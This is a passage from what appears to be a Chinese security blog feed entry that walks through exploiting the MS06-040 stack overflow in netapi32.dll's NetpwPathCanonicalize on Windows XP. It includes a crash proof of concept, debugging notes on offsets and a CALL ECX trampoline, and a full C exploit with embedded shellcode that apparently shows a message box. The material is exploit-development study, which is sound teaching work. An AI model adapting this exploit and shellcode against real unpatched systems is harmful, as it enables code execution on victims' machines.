class="line">...</span><br></pre></td></tr></table></figure><p>如果能够使 CanonicalizePathName 调用失败（返回值非 0），NetpwPathCanonicalize 将直接退出，从而保证 Buff_OF 所在的栈空间不发生变化。由于参数 maxbuf 是可控的，我们可 以 利 用 较 小 的 maxbuf ， 使 CanonicalizePathName 返 回 NERR_BufTooSmall （参看 0x71BA4317-0x71BA4328）而直接退出。</p><p>MS06-040 在 Windows XP 下溢出的 POC 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE (0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试-2"><a class="markdownIt-Anchor" href="#动态调试-2"></a> 动态调试</h2><p>在动态调试时，当第二次调用 NetpwPathCanonicalize，运行至 0x5FDDA33E 处的 wcscat 时发生了栈溢出，如下图所示。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717215304487.png" alt="image-20220717215304487"></p><p>可以看到， EBP、返回地址以及 CanonicalizePathName 的部分参数被覆盖，溢出成功。ecx 始终指向栈中（0x0012EA18），那我们就选用 0x71BBFCBE 处的 CALL ECX 作为跳板。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717220145700.png" alt="image-20220717220145700"></p><p>从上面溢出图片可以看出，0x0012EE2C 是被 ”bbbb“ 溢出覆盖了，我们只用找到它相对偏移就能够替换掉 0x0012EE2C 处的内容。向前找到 b 的起始位置，可以看到 b 从 0x0012EB9A 处开始，相对偏移就是 0x(292+4)。直接在钩造完成后，复制前，把PathName2[296] 覆盖为我们想要的地址( 0x71BBFCBE )。</p><p>因为我们需要执行 shellcode，所以我们要把 shellcode 放在 PathName1 的开头，就能运行。</p><p>按照如下布局，构建代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(__stdcall * MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH1_SIZE (0xc2*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH2_SIZE (0x150*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OUTBUF_SIZE 0x440</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREFIX_SIZE 0x410</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ShellCode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> PathName1[PATH1_SIZE];</span><br><span class="line">    <span class="type">char</span> PathName2[PATH2_SIZE];</span><br><span class="line">    <span class="type">char</span> Outbuf[OUTBUF_SIZE];</span><br><span class="line">    <span class="type">int</span> OutbufLen=OUTBUF_SIZE;</span><br><span class="line">    <span class="type">char</span> Prefix1[PREFIX_SIZE];</span><br><span class="line">    <span class="type">char</span> Prefix2[PREFIX_SIZE];</span><br><span class="line">    <span class="type">long</span> PathType1=<span class="number">44</span>;</span><br><span class="line">    <span class="type">long</span> PathType2=<span class="number">44</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//load vulnerability netapi32.dll which we got from a WINXP sp0 host</span></span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[ ] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[ ] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fill PathName</span></span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName1));</span><br><span class="line">    <span class="built_in">memset</span>(PathName1,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(PathName1)<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将ShellCode拷贝到缓冲区中</span></span><br><span class="line"><span class="built_in">memcpy</span>(PathName1, ShellCode, <span class="keyword">sizeof</span>(ShellCode));</span><br><span class="line"><span class="comment">// 将ShellCode后面的0x00填充为0x90</span></span><br><span class="line">PathName1[<span class="keyword">sizeof</span>(ShellCode)<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// set Prefix as a null string</span></span><br><span class="line">    <span class="built_in">memset</span>(Prefix1,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix1));</span><br><span class="line">    <span class="built_in">memset</span>(Prefix2,<span class="number">0</span>,<span class="keyword">sizeof</span>(Prefix2));</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="number">0</span>,<span class="keyword">sizeof</span>(PathName2));</span><br><span class="line">    <span class="built_in">memset</span>(PathName2,<span class="string">&#x27;b&#x27;</span>,<span class="keyword">sizeof</span>(PathName2)<span class="number">-2</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 将返回地址覆盖为jmp ebp 71BBFCBE</span></span><br><span class="line">PathName2[<span class="number">0x296</span>] = <span class="number">0xBE</span>;</span><br><span class="line">PathName2[<span class="number">0x297</span>] = <span class="number">0xFC</span>;</span><br><span class="line">PathName2[<span class="number">0x298</span>] = <span class="number">0xBB</span>;</span><br><span class="line">PathName2[<span class="number">0x299</span>] = <span class="number">0x71</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// call NetpwPathCanonicalize several times to overflow</span></span><br><span class="line">    (Trigger)(PathName1,Outbuf,<span class="number">1</span> ,Prefix1,&amp;PathType1,<span class="number">0</span>);</span><br><span class="line">    (Trigger)(PathName2,Outbuf,OutbufLen,Prefix2,&amp;PathType2,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，运行，又是我们熟悉的对话框。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717230456660.png" alt="image-20220717230456660"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;rpc-漏洞&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#rpc-漏洞&quot;&gt;&lt;/a&gt; RPC 漏洞&lt;/h1&gt;
&lt;h2 id=&quot;rpc-漏洞简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hre</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="漏洞" scheme="https://www.rgzzplus.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
</feed>
